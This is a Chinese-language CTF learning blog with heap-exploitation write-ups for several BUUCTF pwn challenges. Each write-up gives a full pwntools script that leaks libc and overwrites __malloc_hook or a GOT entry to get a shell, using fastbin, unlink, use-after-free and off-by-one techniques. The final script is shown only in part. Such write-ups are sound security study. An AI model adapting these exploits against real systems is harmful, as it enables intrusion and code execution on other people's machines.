---
title: "CTF-user-pwn 堆漏洞做题日志 0x00 版"
description: "在做题日志 0x00 版，存在部分谬误待修正，如有错误请指出。"
date: 2026-03-20T00:00:00+08:00
image: pwn_heap_q0.jpg
math: true
license: 
hidden: false
comments: true
draft: false
categories:
    - ctf
tags:
    - ctf
    - 学习日志
---

关于 `/bin/sh` 填在哪里的问题：

* 如果是覆写 got 表，那么写在指针指向的数据区。
* 如果是改写函数指针，且程序把结构体首地址作为参数传了进去，那么把传进函数的地址直接改写成 `;sh\x00`。


### babyheap_0ctf_2017

[题目链接](https://buuoj.cn/challenges#babyheap_0ctf_2017)

这是我第一个堆漏洞题目，详细记录一下，这个做法好像叫 **Fastbin 攻击**。

**所有的内存地址都是不动的**，所谓“加入 Allocate 区”都是形象化表述。

发现这个题有个菜单，显然的堆漏洞题目，但是它的 fill 没有检查 chunk 大小，所以显然可以堆溢出。

首先泄露 libc 基址，因为可以堆溢出，所以我们可以通过 溢出 chunk_0 修改 chunk_1 的 size 值，使 chunk_1 和 chunk_2 **表面上合并**（Glibc 认为 chunk_1 是一个大小为 0xb0 的大块），这会使 chunk_1 被释放时带着 chunk_2 一起进 unsorted bins（双向链表，fd 指向 main_arena + 88）。

然而 free 函数是直接对着 chunk 的标号释放内存的，所以我们把 chunk_1 free 掉，这使 chunk_1 不可被打印，**但是 chunk_2 是可以打印**的**在 unsorted bins 的**数据。

这时我们通过 allocate 在巨大的 chunk_1 上切割掉原本的 chunk_1 大小（复活 chunk_1），其 fd 指针刚好重写到原本 chunk_2 的 user_data 部分，这就可以打印出 chunk_2 的 fd 指针。

（注意：chunk_1 + chunk_2 至少要等于 0x80 防止掉入 fastbins，要设 chunk_3 防止掉到 TOP chunk）

main_arena+88 到 __malloc_hook 的偏移固定为 -0x68，而 __malloc_hook 是一个调试函数（glibc 2.34 之前），在执行 malloc 时，会先检测 __malloc_hook 的值，如果 __malloc_hook 的值存在，则执行该地址。

那么我们要把 __malloc_hook 移动到 Allocate 区，这疑似是一个模板，因为 __malloc_hook 在 -0x23 偏移区域附近有 0x7f 可以看作 0x70 的 size，所以可以通过先把 __malloc_hook 塞进 fastbins，然后再把它作为一个伪 chunk malloc 出来。

如何把它放到 fastbins 呢？fastbins 是单向链表，其 fd 指针指向了上一个被释放的 chunk，所以我们可以把 fastbins 的另一个块的 fd 篡改。

（注意：fd 指针在 user_data 区，所以要先把要篡改的 chunk 丢进 fastbins，再堆溢出篡改）

具体来讲，就是申请 chunk_4 和 chunk_5，把 chunk_5 释放丢进 fastbins，然后再 chunk_4 堆溢出，修改 chunk_5 的 fd 指针为 __malloc_hook - 0x23。

接着把 chunk_5 复活，这样 fastbins 就会把 fake fd 指向的 __malloc_hook - 0x23 加入 fastbins。

那么再申请一个 chunk_6 大小为 0x60，这样就会把 __malloc_hook 加入 Allocate 区。

（注意：malloc 要求 fd 指针有要求两个块大小差不多，所以 chunk_5 也要是 0x60 的大小）

最后依旧是固定偏移，__malloc_hook - 0x13 的位置放着其地址，上面填上 one_gagdet，最后 malloc 触发即可。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')
context.terminal = ['tmux', 'splitw', '-h']

host = "node5.buuoj.cn"
port = 28455
io = remote(host,port)
libc = ELF("./libc-2.23.so")
# io = process("./babyheap_0ctf_2017")

def Allocate(size):
    io.recvuntil(b"Command: ")
    io.sendline(b"1")
    io.recvuntil(b"Size: ")
    io.sendline(str(size))

def Fill(index,content):
    io.recvuntil(b"Command: ")
    io.sendline(b'2')
    io.recvuntil(b"Index: ")
    io.sendline(str(index))
    io.recvuntil(b"Size: ")
    io.sendline(str(len(content)))
    io.recvuntil(b"Content: ")
    io.send(content)

def Free(index):
    io.recvuntil(b"Command: ")
    io.sendline(b'3')
    io.recvuntil(b"Index: ")
    io.sendline(str(index))

def Dump(index):
    io.recvuntil(b"Command: ")
    io.sendline(b'4')
    io.recvuntil(b"Index: ")
    io.sendline(str(index))

def main():
    Allocate(0x10)  # index 0
    Allocate(0x10)  # index 1
    Allocate(0x80)  # index 2
    Allocate(0x10)  # index 3 : Guarder of top chunk
    payload_1 = b'A'*0x10 + p64(0) + p64(0xB1)
    Fill(0,payload_1)   # chunk_1 += chunk_2
    Free(1)
    Allocate(0x10)    # Index 1: chunk_1 reborn
    Dump(2)
    io.recvuntil(b"Content: \n")
    leak_data = io.recvn(8)
    leak_addr = u64(leak_data)
    print("\n[+] Leak main_arena+88 address :",hex(leak_addr))
    malloc_hook_addr = leak_addr - 0x68
    print("\n[+] Leak malloc hook address :",hex(malloc_hook_addr))
    libc_base = malloc_hook_addr - libc.sym['__malloc_hook']
    print("\n[+] Leak libc base address :",hex(libc_base))
    Allocate(0x10)  # index 4
    Allocate(0x60)  # index 5
    Free(5)
    payload_2 = b'A'*0x10 + p64(0) + p64(0x71) + p64(malloc_hook_addr - 0x23)
    Fill(4,payload_2)   
    Allocate(0x60)      # index 5 : chunk_5 reborn
    Allocate(0x60)      # index 6 : __malloc_hook into Allocate chunk
    one_gadget_offset = 0x4526a
    one_gadget = libc_base + one_gadget_offset
    print("\n[+] Leak one_gadget address :",hex(one_gadget))
    payload_3 = b'A'*0x13 + p64(one_gadget)
    Fill(6,payload_3)
    Allocate(256)
    io.interactive()

if __name__ == "__main__":
    main()
```

upd on 26/04/02

BUU CTF 上有一道完全相同的题目。

[题目链接](https://buuoj.cn/challenges#0ctf_2017_babyheap)

但是我按照相同的思路去做的时候并没有做出来，究其原因，是因为上面那份代码在申请 chunk_4 和 chunk_5 的时候，恰好 0x20 + 0x70 = 0x90 让在 unsortedbins 中存在的 chunk_2 切完了。

但是这一点并没能在上面提到，所以这里补充一个新的脚本：

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')
context.terminal = ['tmux', 'splitw', '-h']

host = "node5.buuoj.cn"
port = 27226
io = remote(host,port)
# io = process("./0ctf_2017_babyheap")
elf = ELF("./0ctf_2017_babyheap")
libc = ELF("./libc-2.23.so")

def Allocate(size):
    io.recvuntil(b"Command: ")
    io.sendline(b'1')
    io.recvuntil(b"Size: ")
    io.sendline(str(size).encode())
    # index = io.recvline()
    # print("[*] SUCCESS FOR",index)    

def Fill(index,content):
    io.recvuntil(b"Command: ")
    io.sendline(b'2')
    io.recvuntil(b"Index: ")
    io.sendline(str(index).encode())
    io.recvuntil(b"Size: ")
    io.sendline(str(len(content)).encode())
    io.recvuntil(b"Content: ")
    io.send(content)

def Free(index):
    io.recvuntil(b"Command: ")
    io.sendline(b'3')
    io.recvuntil(b"Index: ")
    io.sendline(str(index).encode())

def Dump(index):
    io.recvuntil(b"Command: ")
    io.sendline(b'4')
    io.recvuntil(b"Index: ")
    io.sendline(str(index).encode())


def main():
    Allocate(0x20)  # index 0
    Allocate(0x10)  # index 1
    Allocate(0x70)  # index 2
    Allocate(0x20)  # index 3 for guard
    payload_0 = b'A'*0x20 + p64(0) + p64(0xA1)
    Fill(0,payload_0)
    Free(1)
    Allocate(0x10)  # index 1 reborn
    Dump(2)
    io.recvuntil(b"Content: \n")
    leak_data = io.recvn(8)
    leak_addr = u64(leak_data)
    print("\n[+] Leak main_arena+88 address :",hex(leak_addr))
    malloc_hook_addr = leak_addr - 0x68
    print("\n[+] Leak __malloc_hook address :",hex(malloc_hook_addr))
    libc_base = malloc_hook_addr - libc.sym['__malloc_hook']
    print("\n[+] Leak libc base address :",hex(libc_base))
    one_gadget_offset = 0x4526a
    one_gadget = one_gadget_offset + libc_base
    print("\n[+] Leak one_gadget address :",hex(one_gadget))
    Allocate(0x70)  # index 4 for index 2 reborn
    Allocate(0x10)  # index 5
    Allocate(0x60)  # index 6
    Free(6)
    payload_1 = b'A'*0x10 + p64(0) + p64(0x71) + p64(malloc_hook_addr - 0x23)
    Fill(5,payload_1)
    Allocate(0x60)  # index 6 reborn
    Allocate(0x60)  # index 7 Allocate __malloc_hook - 0x23
    payload_2 = b'A'*0x13 + p64(one_gadget)
    Fill(7,payload_2)
    Allocate(256)
    io.interactive()


if __name__ == "__main__":
    main()
```

### easyheap

[题目链接](https://buuoj.cn/challenges#[ZJCTF%202019]EasyHeap)

由于没做出来，所以面向结果写题解了，对不起。

Safe Unlink 攻击。

因为没有打印了，所以不太可能泄露 main_arena 了。

由于 chunk 被释放时会检查前一个 chunk 是否被释放（即 size&1），若前一个 chunk 被释放就可能触发合并。

合并有一个检查机制，即 unlink，**其作用是检查其链表完整性，同时把要被合并的 chunk_1 摘除**，其 C 伪代码如下：

```
/* * 宏定义：把 chunk P 从双向链表中摘除
 * P：我们要摘除的 Chunk 的首地址
 */
#define unlink(P, BK, FD) {                                            
    // 1. 拿到 P 的前向指针和后向指针
    FD = P->fd;                                                          
    BK = P->bk;                                                          
    
    // 2. Safe Unlink 检查
    // 检查 FD 的 bk 是不是指回 P，检查 BK 的 fd 是不是指回 P
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0)) {              
        malloc_printerr ("corrupted double-linked list");                
    }                                                                    
    
    // 3. 安检通过后，执行真正的“摘除”操作
    else {                                                               
        FD->bk = BK;   // 让下一个块的 bk 指向上一个块
        BK->fd = FD;   // 让上一个块的 fd 指向下一个块
    }                                                                    
}
```

假设存在三个 chunk：chunk_0 (使用中) -> chunk_1 (已释放) -> chunk_2 (使用中，即将被释放)。

现在，执行 `free(chunk_2)`，由于 chunk_1 已释放，所以触发 unlink 机制。

检查前一个的后一个是不是 P，后一个的前一个是不是 P（**注意这里 FD 和 BK 都指的是 unsortedbins 的其他 chunk，而不指物理相邻的 chunk_0 或 chunk_2**）

如果完成了检查，接着摘除 chunk_1，假设在 unsortedbins 的 FD 指向 chunk_X，BK 指向 chunk_Y，那么发现最后 chunk_X 和 chunk_Y 成功链接，chunk_1 被解放了。

随即 chunk_1 和 chunk_2 合并成为一个新的 chunk，进入 unsortedbins 写入新的 fd 和 bk。

所以我们可以利用这一点，构造一个假 chunk，实现写入数据。

这道题特点是没有开 PIE，而且存在一个全局变量 heaparray 存储了所有申请了的 chunk 的头指针。

假设申请 chunk_0 和 chunk_1，当存在堆溢出漏洞时，可以覆盖 chunk_1 的 prev_size（构造假 chunk 想去哪去哪）和 size（消除 P 位触发合并）。

在 chunk_0 中构造假 chunk，释放的 chunk 的构造如下：

```
INTERNAL_SIZE_T      mchunk_prev_size;
INTERNAL_SIZE_T      mchunk_size;
struct malloc_chunk* fd;
struct malloc_chunk* bk;
……
```

为了使检查通过，我们需要利用存储了 chunk_0 头指针的 heaparray[0]，因为 chunk 的构造，所以我们可以认为 fd = P + 0x10，bk = P + 0x18。

既然它要检查 FD 的 bk，那么就让 FD = P - 0x18，同理 BK = P - 0x10。（令 P 为 heaparray[0]）

检查通过后就会让 heaparray[0] 从存储一个堆的头指针到**存储 bss 段上的一个地址（heaparray - 0x18）**。

此时此刻，我们再用 edit 修改 chunk_0 就直接在 heaparray - 0x18 处开始修改了，因此我们需要再填 0x18 个字节，再往 heaparray[0] 填上 free 的 got 表。

此时此刻，我们再用 edit 修改 chunk_0 就直接修改 free 的 got 表了，所以我们直接填上 system。

接着 free 一个带 binsh 的 chunk 就结束了。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')

host = "node5.buuoj.cn"
port = 26750
io = remote(host,port)
# io = process("./easyheap")
elf = ELF("./easyheap")
ptr = 0x6020E0

def create(size,content):
    io.recvuntil(b"Your choice :")
    io.sendline(b'1')
    io.recvuntil(b"Size of Heap : ")
    io.sendline(str(size))
    io.recvuntil(b"Content of heap:")
    io.sendline(content)

def edit(index,content):
    io.recvuntil(b"Your choice :")
    io.sendline(b'2')
    io.recvuntil(b"Index :")
    io.sendline(str(index))
    io.recvuntil(b"Size of Heap : ")
    io.sendline(str(len(content)))
    io.recvuntil(b"Content of heap : ")
    io.sendline(content)

def delete(index):
    io.recvuntil(b"Your choice :")
    io.sendline(b'3')
    io.recvuntil(b"Index :")
    io.sendline(str(index))

def main():
    create(0x80,b"this_is_index_0")  # index 0
    create(0x80,b"this_is_index_1")  # index 1
    create(0x80,b"/bin/sh\x00")      # index 2
    fake_prev_size = p64(0)
    fake_size = p64(0x81)
    fake_fd = p64(ptr - 0x18)
    fake_bk = p64(ptr - 0x10)
    fake_chunk = fake_prev_size + fake_size + fake_fd + fake_bk
    padding = b'A'*0x60
    chunk_1_fake_prev_size = p64(0x80)
    chunk_1_fake_size = p64(0x90)
    payload_1 = fake_chunk + padding + chunk_1_fake_prev_size + chunk_1_fake_size
    edit(0,payload_1)
    delete(1)   # merge chunk_0 && chunk_1
    payload_2 = p64(0)*3 + p64(elf.got['free'])
    edit(0,payload_2)
    system_addr = elf.plt['system']
    edit(0,p64(system_addr))
    delete(2)
    io.interactive()

if __name__ == "__main__":
    main()
```

### hitcontraining_uaf

[hitcontraining_uaf](https://buuoj.cn/challenges#hitcontraining_uaf)

唉初学者认为这道题比上两道题简单多了。

见字如面（？）uaf 即 use after free，简单来说就是 free 一个 chunk 之后其指针并没有置为 NULL。

这道题随便申请两个块，发现每申请一次就会申请一个大小 为 0x10 的管理 chunk 和符合你要求的 chunk，那个管理 chunk 放着一个神秘地址 0x080485fb 和被它管理的 chunk 的 user_data 起始地址。

那么不难发现当调用 print 的时候其实是去管理 chunk 里找的，我们把它换成后门地址。

具体怎么换呢，我们删掉两个管理 chunk，然后申请一个 0x08（加上 size 是 0x10）的 chunk，那么这个 chunk 的管理 chunk 就是把第二个管理 chunk 拿过来用，这个 chunk 的 user chunk 就是第一个 chunk。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'i386',log_level = 'debug')
context.terminal = ['tmux', 'splitw', '-h']

host = "node5.buuoj.cn"
port = 28011
io = remote(host,port)
# io = process("./hacknote")
elf = ELF("./hacknote")
magic = 0x8048945

def add_note(content):
    io.recvuntil(b"Your choice :")
    io.sendline(b'1')
    io.recvuntil(b"Note size :")
    io.sendline(str(len(content)).encode())
    io.recvuntil(b"Content :")
    io.send(content)

def del_note(index):
    io.recvuntil(b"Your choice :")
    io.sendline(b'2')
    io.recvuntil(b"Index :")
    io.sendline(str(index).encode())

def print_note(index):
    io.recvuntil(b"Your choice :")
    io.sendline(b'3')
    io.recvuntil(b"Index :")
    io.sendline(str(index).encode())

def main():
    add_note(b'A'*0x80)  # index 0
    add_note(b'B'*0x80)  # index 1 for guard
    del_note(0)
    del_note(1)
    add_note(p32(magic) + b'C'*4)   # 管理 chunk
    print_note(0)
    io.interactive()

    
if __name__ == "__main__":
    main()
```

### hitcontraining_heapcreator

[题目链接](https://buuoj.cn/challenges#hitcontraining_heapcreator)

先随便申请两个块看看，发现依旧是 manage_chunk + user_chunk 模式，manage_chunk 按顺序放了 0，manage_chunk 的大小，user_chunk 的 user_data 部分大小，user_data 的起始地址。

IDA 在 delete() 函数中找到了 `*(&heaparray + n0xA) = 0;` 每次删除 chunk 都会把指针置为 0，宣布 uaf 死掉了。

在 edit_heap() 函数找到了限制栈溢出的代码：`read_input(*((_QWORD *)*(&heaparray + n0xA) + 1), *(_QWORD *)*(&heaparray + n0xA) + 1LL);`

第一个参数是地址，QWORD + 1 代表管理 chunk 的 user_data 按照 64 位 后移一位存放的数据，就是 user_chunk 的 user_data 的起始地址。

第二个参数是长度，这里最后 +1LL，代表可以输入 user_data 的长度 +1 的长度，也就是存在 1 字节的溢出空间，称为 One-byte-overflow 漏洞。

初步思路是申请 chunk_0,chunk_1,chunk_2，通过单字节溢出可以修改 chunk_1 的 manage_chunk 大小，让 manage_chunk_1 包裹 user_chunk_1 和 manage_chunk_2，这样 delete() 的时候会把他们一起放入 bins，然后 malloc() 一个一样大小的就可以修改manage_chunk_2，使 manage_chunk_2 存储的 user_chunk_2_user_data 起始地址改为 free_got，edit user_chunk_2，就可以修改 free_got 表的内容。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')
context.terminal = ['tmux', 'splitw', '-h']

host = "node5.buuoj.cn"
port = 29025
io = remote(host,port)
# io = process("./heapcreator")
elf = ELF("./heapcreator")
libc = ELF("./libc-2.23.so")
free_got = elf.got['free']
# heaparray = 0x6020A0

def create(size,content):
    io.recvuntil(b"Your choice :")
    io.sendline(b'1')
    io.recvuntil(b"Size of Heap : ")
    io.sendline(str(size).encode())
    io.recvuntil(b"Content of heap:")
    io.send(content)

def edit(index,content):
    io.recvuntil(b"Your choice :")
    io.sendline(b'2')
    io.recvuntil(b"Index :")
    io.sendline(str(index).encode())
    io.recvuntil(b"Content of heap : ")
    io.send(content)

def show(index):
    io.recvuntil(b"Your choice :")
    io.sendline(b'3')
    io.recvuntil(b"Index :")
    io.sendline(str(index).encode())

def delete(index):
    io.recvuntil(b"Your choice :")
    io.sendline(b'4')
    io.recvuntil(b"Index :")
    io.sendline(str(index).encode())

def main():
    create(0x78,b"AAAA")    # index 0
    create(0x20,b"BBBB")    # index 1 
    create(0x20,b'CCCC')    # index 2 for guard
    payload_0 = b'D'*0x78 + b'\x71' # manage_chunk_1 (0x20) + user_chunk_1 (0x30) + manage_chunk_2_header(0x18) = 0x68 向上取整 → 0x71
    edit(0,payload_0)
    # gdb.attach(io)
    delete(1)
    create(0x60,b'EEEEEEEE')
    payload_1 = b'F'*0x10 + b'G'*0x30 + p64(0) + p64(0x21) + p64(0x20) + p64(free_got)
    # manage_chunk_1_tail(0x10) + user_chunk_1 (0x30) + manage_chunk_2_header(0x20 → 0 + manage_chunk_size + user_data_size + user_data_addr)
    edit(1,payload_1)
    # gdb.attach(io)
    # edit(2)
    show(2)
    io.recvuntil(b"Content : ")
    leak_data = io.recvline().strip()
    leak_data = leak_data.ljust(8,b'\x00')
    free_addr = u64(leak_data)
    print("\n [+] Leak free address :",hex(free_addr))
    libc_base = free_addr - libc.sym['free']
    print("\n [+] Leak libc base address :",hex(libc_base))
    system = libc_base + libc.sym['system']
    print("\n [+] Leak system address :",hex(system))
    edit(2,p64(system))
    edit(0,b"/bin/sh\x00")
    delete(0)
    io.interactive()

if __name__ == "__main__":
    main()
```

### ciscn_2019_n_3

先申请两个块看看，发现依然是 manage_chunk + user_chunk 的模式，manage_chunk 分别放着 0，manage_chunk大小，rec_str_print 地址，rec_str_free 地址（当申请类型是 text 时）

简单看看 IDA，发现 new 函数没有什么溢出漏洞，但是 del 函数没有把头指针置空，而且 plt 表里面有 system，那么思路就比较明显，use after free，先申请 chunk_0 和 chunk_1，然后释放，再申请一个大小和 manage_chunk 一样大的，就可以控制 manage_chunk_0。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'i386',log_level = 'debug')
context.terminal = ['tmux', 'splitw', '-h']

host = "node5.buuoj.cn"
port = 26565
io = remote(host,port)
# io = process("./ciscn_2019_n_3")
elf = ELF("./ciscn_2019_n_3")
system = elf.plt['system']

def New(index,length,value):
    io.recvuntil(b"CNote > ")
    io.sendline(b'1')
    io.recvuntil(b"Index > ")
    io.sendline(str(index).encode())
    io.recvuntil(b"Type > ")
    io.sendline(b"2")   # Type > text(string)
    io.recvuntil(b"Length > ")
    io.sendline(str(length).encode())
    io.recvuntil(b"Value > ")
    io.sendline(value)

def Del(index):
    io.recvuntil(b"CNote > ")
    io.sendline(b'2')
    io.recvuntil(b"Index > ")
    io.sendline(str(index).encode())

def show(index):
    io.recvuntil(b"CNote > ")
    io.sendline(b'3')
    io.recvuntil(b"Index > ")
    io.sendline(str(index).encode())

def main():
    New(0,0x70,b'/bin/sh\x00')   # index 0
    New(1,0x70,b'AAAA')   # index 1
    New(2,0x70,b'BBBB')   # index 2 for guard
    # gdb.attach(io)
    Del(0)
    Del(1)
    payload_0 = b'sh\x00\x00' + p32(system)
    New(3,12,payload_0)
    # New(4,0x70,b'')
    # gdb.attach(io)
    Del(0)
    io.interactive()

if __name__ == "__main__":
    main()
```

### babyfengshui_33c3_2016

[题目链接](https://buuoj.cn/challenges#babyfengshui_33c3_2016)

依旧是申请两个块看看，发现是 user_chunk + manage_chunk 的模式，manage_chunk 在其后，依次放着 manage_chunk_size，user_chunk_user_data 的起始地址，申请时填入的 name，且 manage_chunk 固定大小为 0x89。

简单看一下 ida，Delete 函数里有 `*(&ptr + n0x31) = 0;`，uaf 被毙了。

Add 函数里有 `sub_80486BB((char *)*(&ptr + (unsigned __int8)n0x31) + 4, 124);` 大概意思好像是输入 name 长度最大为 124，堆溢出被毙了

updata 函数里也有检查输入长度不超过chunk本身长度的，堆溢出被毙了。

但是仔细看这个 update 的检查机制，发现 `(char *)(v3 + *(_DWORD *)*(&ptr + n0x31)) >= (char *)*(&ptr + n0x31) - 4` 就是 `输入的长度+user_chunk_user_data 的起始地址` >= `manage_chunk 的起始地址` 时退出。

那么我们可以考虑让 user_chunk 和 manage_chunk 离得远一点，形成一个

两面包夹芝士！

如何实现也很简单，既然先申请 user_chunk，那么 bins 放好 user_chunk 那么大的内存，后申请的 manage_chunk 就在 Top_chunk 切一块。

这样我们就想怎么溢出怎么溢出了，这道题的打印函数和修改函数还都很齐全，所以下面的思路就比较平凡：

通过 chunk_1 堆溢出修改 manage_chunk_2 里存放的 user_chunk_2_user_data 的起始地址，改成 free_got，然后用 display 函数打印出 free 的真实地址，这样我就可以 ret2libc，然后用 update 函数把 free_got 覆写成 system。

（PS：我不知道为什么我把 free 覆写成 system 之后不论如何都不能再 Add 了，并且因为某些 fgets 的原因调试了很久，那个 name 是固定 `fgets(124)`，必须用 sendline，但是那个 text 我们最好还是用 send，因为一个神秘换行符调试了很久，haha 我真菜吧，挫败感十足啊。）

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'i386',log_level = 'debug')
context.terminal = ['tmux', 'splitw', '-h']

host = "node5.buuoj.cn"
port = 27449
io = remote(host,port)
# io = process("./babyfengshui_33c3_2016")
elf = ELF("./babyfengshui_33c3_2016")
libc = ELF("./libc-2.23.so")
free_got = elf.got['free']

def Add(description_size,name,text_length,text):
    io.recvuntil(b"Action: ")
    io.sendline(b'0')
    io.recvuntil(b"size of description: ")
    io.sendline(str(description_size).encode())
    io.recvuntil(b"name: ")
    io.sendline(name)
    io.recvuntil(b"text length: ")
    io.sendline(str(text_length).encode())
    io.recvuntil(b"text: ")
    io.send(text)

def Delete(index):
    io.recvuntil(b"Action: ")
    io.sendline(b'1')
    io.recvuntil(b"index: ")
    io.sendline(str(index).encode())

def Display(index):
    io.recvuntil(b"Action: ")
    io.sendline(b'2')
    io.recvuntil(b"index: ")
    io.sendline(str(index).encode())
    
def Update(index,text_length,text):
    io.recvuntil(b"Action: ")
    io.sendline(b'3')
    io.recvuntil(b"index: ")
    io.sendline(str(index).encode())
    io.recvuntil(b"text length: ")
    io.sendline(str(text_length).encode())
    io.recvuntil(b"text: ")
    io.send(text)


def main():
    Add(0x78,b'A'*0x77,0x78,b'B'*0x78) # index 0
    Add(0x78,b'C'*0x77,0x78,b'D'*0x78) # index 1
    Add(0x78,b'E'*0x77,0x78,b'F'*0x78) # index 2 for guard
    # gdb.attach(io)
    Delete(1)
    Add(0x100,b'G'*0xFF,0x100,b'H'*0x100) # index 3 for index 1 reborn and manage_chunk come from TOP_chunk
    payload_0 = b"/bin/sh\x00" + b'I'*0xF4 + p32(0x80) + p32(0x100) + p32(0x81) + b'J'*0x78 + p32(0) + p32(0x89) + p32(free_got)
    Update(3,len(payload_0),payload_0)
    # gdb.attach(io)
    Display(2)
    io.recvuntil(b"description: ")
    leak_data = io.recvn(4)
    free_addr = u32(leak_data)
    print("\n[+] Leak free address :",hex(free_addr))
    libc_base = free_addr - libc.sym['free']
    print("\n[+] Leak Libc base address :",hex(libc_base))
    system = libc_base + libc.sym['system']
    print("\n[+] Leak system address :",hex(system))
    Update(2,4,p32(system))
    # gdb.attach(io)
    Delete(3)
    io.interactive()

if __name__ == "__main__":
    main()
```

### hitcon2014_stkof

[题目链接](https://buuoj.cn/challenges#hitcon2014_stkof)

简单跑一下程序，这啥提示回显也没有我也是无语，伪代码也看不懂，试一下大概操作 1 是 Allocate，操作 2 是 Update，操作 3 是 Free，操作 4 是啥我也是没认出来好吧，反正不是 print。

随便申请两个堆 gdb 调试一下。

神秘的发现，会有两个无关 chunk，询问了一下 AI，AI 告诉我这个是 glibc 的缓冲区相关一些东西，不用管。

但是我天性胆小，看着这两个大 chunk 包围着 chunk_1，我就打算放弃 chunk_1 了（）

IDA 中 free 函数里有 `(&::s)[n0x100000] = 0;`，推测 uaf已死，但是这个 s 数组存储 chunk 头指针，是在 bss 段上的，0x602140。

IDA 中 Update 函数没有检查长度，存在堆溢出。

那么可以 unlink 攻击。

不过需要注意的一点是，（经过调试发现）这道题因为没有 index 0，所以 s[0] 是空的，加上我个人是从 chunk_2 开始利用的，所以 s 需要加上 0x10。

这道题还没有 system，我们需要 ret2libc，所以考虑再搞一个 chunk_3，chunk_2 用来覆写 free 函数的 got 表，chunk_3 用来泄露 puts 的真实地址。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')
context.terminal = ['tmux', 'splitw', '-h']

host = "node5.buuoj.cn"
port = 27869
io = remote(host,port)
# io = process("./stkof")
elf = ELF("./stkof")
libc = ELF("./libc-2.23.so")
free_got = elf.got['free']
puts_got = elf.got['puts']
s = 0x602150

def Allocate(size):
    io.sendline(b'1')
    sleep(0.1)
    io.sendline(str(size).encode())
    index = io.recvline().strip()
    io.recvuntil(b"OK\n")
    print("\n[*] SUCCESS for allocate index ",index)

def Update(index,content):
    io.sendline(b'2')
    sleep(0.1)
    io.sendline(str(index).encode())
    sleep(0.1)
    io.sendline(str(len(content)).encode())
    sleep(0.1)
    io.send(content)

def Free(index):
    io.sendline(b'3')
    sleep(0.1)
    io.sendline(str(index).encode())

def main():
    Allocate(0x80)  # index 1
    Allocate(0x80)  # index 2
    Allocate(0x80)  # index 3
    Allocate(0x80)  # index 4 for guard
    target = s
    fake_prev_size = 0
    fake_size = 0x81
    fake_fd = target - 0x18
    fake_bk = target - 0x10
    padding = b'A'*0x60
    payload_0 = p64(fake_prev_size) + p64(fake_size) + p64(fake_fd) + p64(fake_bk) + padding + p64(0x80) + p64(0x90)
    Update(2,payload_0)
    Update(4,b'/bin/sh\x00')
    Free(3)
    payload_1 = p64(0)*3 + p64(elf.got['free']) + p64(elf.got['puts'])
    Update(2,payload_1)
    puts_plt = elf.plt['puts']
    Update(2,p64(puts_plt))
    io.clean()
    Free(3)
    leak_data = io.recvline().strip().ljust(8,b'\x00')
    puts_addr = u64(leak_data)
    print("\n[+] Leak puts address :",hex(puts_addr))
    libc_base = puts_addr - libc.sym['puts']
    print("\n[+] Leak libc base address :",hex(libc_base))
    system = libc_base + libc.sym['system']
    print("\n[+] Leak system address :",hex(system))
    Update(2,p64(system))
    Free(4)
    io.interactive()

if __name__ == "__main__":
    main()

```

### pwnable_hacknote

[题目链接](https://buuoj.cn/challenges#pwnable_hacknote)

随便申请几个 chunk，发现是 manage_chunk + user_chunk 模式，manage_chunk 上依次放着 0，manage_chunk_size（0x11），_puts_w 的地址（0x0804862b），user_chunk_user_data 的起始地址。

简单检查一下，Add 函数没有检查堆长度，可以任意溢出，但是这个不是 update，疑似溢出了也不能覆盖下面申请的 chunk，没什么用吧。

delete 函数也没有把头指针置 0。

存储头指针的数组在 bss 段上，0x804A050。

没有 system 的 plt。

大概是 uaf，ret2libc 然后覆写 _puts_w 的地址。

但是我不知道为什么，感觉这道题靶机有点问题，反正是泄露 puts 打不通，泄露 main_arena+88 可以打通。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'i386',log_level = 'debug')
context.terminal = ['tmux', 'splitw', '-h']

host = "node5.buuoj.cn"
port = 27849
io = remote(host,port)
# io = process("./hacknote")
elf = ELF("./hacknote")
libc = ELF("./libc-2.23.so")
puts_got = elf.got['puts']

def Add(size,content):
    io.recvuntil(b"Your choice :")
    io.sendline('1')
    io.recvuntil(b"Note size :")
    io.sendline(str(size).encode())
    io.recvuntil(b"Content :")
    io.send(content)

def Delete(index):
    io.recvuntil(b"Your choice :")
    io.sendline('2')
    io.recvuntil(b"Index :")
    io.sendline(str(index).encode())

def Print(index):
    io.recvuntil(b"Your choice :")
    io.sendline('3')
    io.recvuntil(b"Index :")
    io.sendline(str(index).encode())

def main():
    Add(0x80,b'A'*0x80) # index 0 
    Add(0x80,b'B'*0x80) # index 1
    Delete(0)
    Add(0x80,'meow')    # index 2
    Print(2)
    io.recvuntil('meow')
    libc_base = u32(io.recv(4)) - 0x1b07b0
    print("\n[+] Leak libc base address :",hex(libc_base))
    system = libc_base + libc.sym['system']
    print("\n[+] Leak one_gadget address :",hex(system))
    Add(0x80,b'C'*0x80) # index 3
    Delete(2)
    Delete(3)
    payload_1 = p32(system) + b";sh\x00"
    Add(0x08,payload_1) # index 4
    Print(2)
    io.interactive()

if __name__ == "__main__":
    main()
```

下面是我没能打通的泄露 puts 版本，有好心大蛇如果愿意帮我看一下错误并告诉我，我会感激不尽的。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'i386',log_level = 'debug')
context.terminal = ['tmux', 'splitw', '-h']

host = "node5.buuoj.cn"
port = 27849
io = remote(host,port)
# io = process("./hacknote")
elf = ELF("./hacknote")
libc = ELF("./libc-2.23.so")
puts_got = elf.got['puts']

def Add(size,content):
    io.recvuntil(b"Your choice :")
    io.sendline('1')
    io.recvuntil(b"Note size :")
    io.sendline(str(size).encode())
    io.recvuntil(b"Content :")
    io.send(content)

def Delete(index):
    io.recvuntil(b"Your choice :")
    io.sendline('2')
    io.recvuntil(b"Index :")
    io.sendline(str(index).encode())

def Print(index):
    io.recvuntil(b"Your choice :")
    io.sendline('3')
    io.recvuntil(b"Index :")
    io.sendline(str(index).encode())

def main():
    Add(0x80,b'A'*0x80) # index 0
